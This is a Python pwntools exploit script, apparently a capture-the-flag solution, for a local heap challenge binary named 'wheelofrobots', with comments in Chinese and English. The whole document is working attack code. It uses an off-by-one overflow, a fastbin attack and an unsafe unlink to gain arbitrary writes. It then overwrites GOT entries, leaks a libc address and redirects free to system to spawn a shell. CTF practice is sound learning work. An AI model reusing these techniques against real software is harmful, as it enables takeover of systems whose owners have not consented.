#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./wheelofrobots")
elf = ELF("./wheelofrobots")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def add(idx, size=0):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    if idx == 2:
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(size))
    elif idx == 3:
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(size))
    elif idx == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(size))


def remove(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))


def change(idx, name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    p.recvuntil("Robot's name: \n")
    p.send(name)


def start_robot():
    p.recvuntil('Your choice :')
    p.sendline('4')


def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)


def write(where, what):
    change(1, p64(where))
    change(6, p64(what))


def exp():
    print "step 1 - fastbin attack"
    # add a fastbin chunk 0x20 and free it
    # fastbin 指针指向：2 bender->NULL
    add(2, 1)  # 2 bender
    remove(2)
    # off-by-one 覆写 idx2 inuse 为 1 让我们能编辑
    overflow_benderinuse('\x01')
    # 覆写 fd 2 0x603138, point to 2 bender's size,后面伪造堆fd就是destructor_size
    # now fastbin 0x20, idx2->0x603138->NULL
    change(2, p64(0x603138))
    # off-by-one 覆写 idx2 inuse 为 1
    # 让我们再一次申请 2 bender
    overflow_benderinuse('\x00')
    # add 2 bender again, fastbin 0x603138->NULL
    # 将原来 2 bender 空间申请出来
    add(2, 1)
    # in order to malloc chunk at 0x603138
    # 绕过fastbin size 检查：将size位伪造一个fastbin范围的值
    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
    # 0x603140 是 3 Devil 的size位，申请fastbin范围即可
    add(3, 0x20)
    # trigger malloc, set tinny point to 0x603148
    add(1)
    # 释放无用堆
    # wheels must <= 3
    # only save tinny(0x603138)
    remove(2)
    remove(3)

    print 'step 2 - unlink'
    # alloc 6 destructor size 60->0x50, chunk content 0x40
    add(6, 3)
    # alloc 3 devil, size=20*7=140, bigger than fastbin
    add(3, 7)
    # edit destructor's size to 1000 by tinny
    change(1, p64(1000))
    # gdb.attach(p)
    # place fake chunk at destructor's pointer
    fakechunk_addr = 0x6030E8
    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
        fakechunk_addr - 0x10) + p64(0x20)
    fakechunk = fakechunk.ljust(0x40, 'a')
    fakechunk += p64(0x40) + p64(0xa0)
    change(6, fakechunk)
    # trigger unlink
    remove(3)

    print 'step 3 - hijack chunk1 ptr'
    # make 0x6030F8 point to 0x6030E8
    payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
    change(6, payload)

    print 'step 4 - hijack exit.got'
    # make exit just as return
    write(elf.got['exit'], 0x401954)

    print 'step 5'
    # set wheel cnt =3, 0x603130 in order to start robot
    write(0x603130, 3)
    # set destructor point to puts@got
    change(1, p64(elf.got['puts']))
    start_robot()
    p.recvuntil('New hands great!! Thx ')
    puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    log.success('libc base: ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    # make free->system
    write(elf.got['free'], system_addr)
    # make destructor point to /bin/sh addr
    write(0x6030E8, binsh_addr)
    # get shell
    remove(6)
    p.interactive()

    pass


if __name__ == "__main__":
    exp()